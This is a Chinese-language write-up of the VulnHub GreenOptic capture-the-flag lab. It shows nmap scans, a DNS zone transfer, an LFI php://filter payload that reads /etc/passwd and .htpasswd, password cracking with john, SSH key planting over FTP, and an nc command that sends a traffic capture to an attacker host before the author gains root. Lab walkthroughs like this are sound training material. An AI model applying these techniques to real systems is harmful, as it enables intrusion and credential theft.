# GREENOPTIC: 1

下载地址：

```
https://download.vulnhub.com/greenoptic/GreenOptic.ova
```

## 实战操作

发现靶机IP地址：`192.168.32.139`。

扫描靶机端口开放情况。

```
┌──(root💀kali)-[~/Desktop]
└─# nmap -sV -p1-65535 192.168.32.139                                                                                                                                                                                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 01:16 EST
Nmap scan report for 192.168.32.139
Host is up (0.00027s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp    open  domain  ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
10000/tcp open  http    MiniServ 1.953 (Webmin httpd)
MAC Address: 00:0C:29:A1:9A:22 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:redhat:enterprise_linux:7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.75 seconds
```

FTP使用匿名登录失败

```
┌──(root💀kali)-[~/Desktop]
└─# ftp 192.168.32.139
Connected to 192.168.32.139.
220 (vsFTPd 3.0.2)
Name (192.168.32.139:root): anomymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

浏览器访问80服务

![](<../../.gitbook/assets/image (10) (1) (1).png>)

查看源代码，没有找到什么东西，使用dirbuster进行目录爆破，找到`account`目录

![](<../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1).png>)

看到inclulde，就可以看看有没有文件包含漏洞。**查看源代码才可以看到有文件信息**。

![](<../../.gitbook/assets/image (21) (1) (1) (1).png>)

暂时没有可以利用的地址，接下来看看10000端口。

![](<../../.gitbook/assets/image (10) (1).png>)

需要写本地hosts地址，`greenoptic.vm`和`websrv01.greenoptic.vm`。

```
┌──(root💀kali)-[~/Desktop]
└─# cat /etc/hosts
192.168.32.139 websrv01.greenoptic.vm
192.168.32.139 greenoptic.vm
```

重新访问这个地址`https://websrv01.greenoptic.vm:10000`。使用弱口令登录失败。

![](<../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

端口开放53端口，测试一下有没有DNS域传送漏洞。

```
┌──(root💀kali)-[~/Desktop]
└─# dig axfr @192.168.32.139 greenoptic.vm


; <<>> DiG 9.16.11-Debian <<>> axfr @192.168.32.139 greenoptic.vm
; (1 server found)
;; global options: +cmd
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
greenoptic.vm.          3600    IN      NS      ns1.greenoptic.vm.
ns1.greenoptic.vm.      3600    IN      A       127.0.0.1
recoveryplan.greenoptic.vm. 3600 IN     A       127.0.0.1
websrv01.greenoptic.vm. 3600    IN      A       127.0.0.1
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
;; Query time: 3 msec
;; SERVER: 192.168.32.139#53(192.168.32.139)
;; WHEN: Mon Dec 27 02:37:18 EST 2021
;; XFR size: 6 records (messages 1, bytes 235)
```

回到本地文件包含漏洞，使用base64方式查看文件，`php://filter/convert.base64-encode/resource=/etc/passwd`。

![](<../../.gitbook/assets/image (20) (1) (1) (1) (1).png>)

取passwd文件里面的用户，查看他的邮件

```
sam:x:1000:1000::/home/sam:/bin/bash
terry:x:1001:1001::/home/terry:/bin/bash
named:x:25:25:Named:/var/named:/sbin/nologin
alex:x:1002:1002::/home/alex:/bin/bash
dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin
dovenull:x:997:993:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin
monitor:x:1003:1003::/home/monitor:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
```

sam用户邮件内容

```
From terry@greenoptic.vm  Sun Jul 12 16:13:45 2020
Return-Path: <terry@greenoptic.vm>
X-Original-To: sam
Delivered-To: sam@websrv01.greenoptic.vm
Received: from localhost (localhost [IPv6:::1])
	by websrv01.greenoptic.vm (Postfix) with ESMTP id A8D371090085
	for <sam>; Sun, 12 Jul 2020 16:13:18 +0100 (BST)
Message-Id: <20200712151322.A8D371090085@websrv01.greenoptic.vm>
Date: Sun, 12 Jul 2020 16:13:18 +0100 (BST)
From: terry@greenoptic.vm

Hi Sam, per the team message, the password is HelloSunshine123
```

![](<../../.gitbook/assets/image (18) (1) (1) (1) (1) (1).png>)

terry用户邮件内容

```
From serversupport@greenoptic.vm  Sun Jul 12 15:52:19 2020
Return-Path: <serversupport@greenoptic.vm>
X-Original-To: terry
Delivered-To: terry@websrv01.greenoptic.vm
Received: from localhost (localhost [IPv6:::1])
	by websrv01.greenoptic.vm (Postfix) with ESMTP id C54E21090083
	for <terry>; Sun, 12 Jul 2020 15:51:32 +0100 (BST)
Message-Id: <20200712145137.C54E21090083@websrv01.greenoptic.vm>
Date: Sun, 12 Jul 2020 15:51:32 +0100 (BST)
From: serversupport@greenoptic.vm

Terry

As per your request we have installed phpBB to help with incident response.
Your username is terry, and your password is wsllsa!2

Let us know if you have issues
Server Support - Linux
```

根据这两封邮件获取到两个用户密码

```
sam/HelloSunshine123
terry/wsllsa!2
```

但是这两个账号密码不能 登录到`account`和`webim`系统。

访问DNS域传送发现域名`recoveryplan.greenoptic.vm`（需加hosts）。就会弹出窗口，输入账号和密码，但是发现还是登录不了。

![](<../../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

查看`/var/www/.htpasswd`文件

```
staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.
```

![](<../../.gitbook/assets/image (28) (1) (1) (1) (1) (1) (1) (1).png>)

使用`john`爆破密码，需要先解压rockyou字典。

`gzip -d /usr/share/wordlists/rockyou.txt.gz`

```
┌──(root💀kali)-[/usr/share/wordlists]
└─# john --wordlist:/usr/share/wordlists/rockyou.txt /tmp/htpasswd 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wheeler          (staff)
1g 0:00:00:00 DONE (2021-12-27 03:10) 6.250g/s 82200p/s 82200c/s 82200C/s guess1..justin01
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                                                               
┌──(root💀kali)-[/usr/share/wordlists]
└─# john --show /tmp/htpasswd                                
staff:wheeler

1 password hash cracked, 0 left
                                 
```

使用`staff/wheeler`登录。

![](<../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1).png>)

使用terry进行登录。

![](<../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1).png>)

找到一则消息，下载`dpi`压缩包。

![](<../../.gitbook/assets/image (19) (1) (1) (1) (1).png>)

使用sam邮件的密码进行解压。

![](<../../.gitbook/assets/image (11) (1) (1) (1).png>)

使用wireshark打开数据包，右键follow TCP stream，找到第25个数据包，是FTP用户登录，`alex/FwejAASD1`。（FTP是明文传输）

![](<../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png>)

使用FTP账号进行登录。

```
┌──(root💀kali)-[~/Downloads]
└─# ftp 192.168.32.139
Connected to 192.168.32.139.
220 (vsFTPd 3.0.2)
Name (192.168.32.139:root): alex
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/home/alex"
ftp> 
```

知道当前目录是`/home/alex`，这样可以上传公钥，用证书登录。

生成公钥和私钥。

```
┌──(root💀kali)-[/tmp]
└─# ssh-keygen          
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /tmp/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id_rsa
Your public key has been saved in /tmp/id_rsa.pub
The key fingerprint is:
SHA256:Q0ht+VhJfqKtOcYclyVknabBEPTte9FKbk3QeRXxHlk root@kali
The key's randomart image is:
+---[RSA 3072]----+
|      .o+*+o . oE|
|     . .+==.+  .*|
|      ...+=++ .++|
|       ..ooB   +o|
|        S + . o +|
|       o *   + = |
|        B   . = .|
|       . .   o   |
|                 |
+----[SHA256]-----+
```

上传公钥到FTP服务器

```
ftp> 
ftp> mkdir .ssh
257 "/home/alex/.ssh" created
ftp> cd .ssh
250 Directory successfully changed.
ftp> put /tmp/id_rsa.pub
local: /tmp/id_rsa.pub remote: /tmp/id_rsa.pub
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
563 bytes sent in 0.00 secs (9.1003 MB/s)
```

使用证书进行登录

```
┌──(root💀kali)-[/tmp]
└─# ssh -i id_rsa alex@192.168.32.139 
[alex@websrv01 ~]$ whoami
alex
[alex@websrv01 ~]$ id
uid=1002(alex) gid=1002(alex) groups=1002(alex),994(wireshark)
```

请注意，`id`这`alex`是wireshark组的一部分？让我们看看那个组可以在这个盒子上运行什么。

```
[alex@websrv01 opt]$ find / -type f -group wireshark 2>/dev/null
/usr/sbin/dumpcap
```

dumpcap命令是wireshark命令行捕捉数据包，猜测靶机自动传输一些敏感信息，抓取所有网卡接口的流量。

```
[alex@websrv01 tmp]$ dumpcap -i any
Capturing on 'any'
File: /tmp/wireshark_pcapng_any_20211227090725_V7WCH2
Packets captured: 394
Packets received/dropped on interface 'any': 394/0 (pcap:0/dumpcap:0/flushed:0) (100.0%)
```

本地部署http服务器，让靶场下载nc命令。

![](<../../.gitbook/assets/image (26) (1) (1) (1) (1).png>)

使用nc命令传输数据。

```
#靶机
[alex@websrv01 tmp]$ chmod +x nc
[alex@websrv01 tmp]$ ./nc -w 3 192.168.32.130 8000 < wireshark_pcapng_any_20211227090725_V7WCH2

#kali
┌──(root💀kali)-[/opt]
└─# nc -lvnp 8000 > wireshark.pcap
listening on [any] 8000 ...
connect to [192.168.32.130] from (UNKNOWN) [192.168.32.139] 42498
```

先排除SSH协议数据包

```
!(ip.addr==192.168.32.130)
```

找到一个SMTP的数据包，里面有一段base64加密的字符串

![](<../../.gitbook/assets/image (8) (1) (1) (1) (1).png>)

解密字符串，得到root密码

```
┌──(root💀kali)-[~/Downloads]
└─# echo AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d
rootASfojoj2eozxczzmedlmedASASDKoj3o                                                                                                                     
```

最后获取root用户成功。

```
[alex@websrv01 tmp]$ su -
Password: 
Last failed login: Mon Dec 27 09:29:09 GMT 2021 on pts/0
There were 2 failed login attempts since the last successful login.
[root@websrv01 ~]# 
[root@websrv01 ~]# ls
anaconda-ks.cfg  root.txt
[root@websrv01 ~]# cat root.txt 
Congratulations on getting root!

  ____                      ___        _   _      
 / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ 
| |  _| '__/ _ \/ _ \ '_ \| | | | '_ \| __| |/ __|
| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ 
 \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|
                                |_|             
  
You've overcome a series of difficult challenges, so well done!

I'm happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.

*********
Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/
*********

Thanks,
bootlesshacker
```
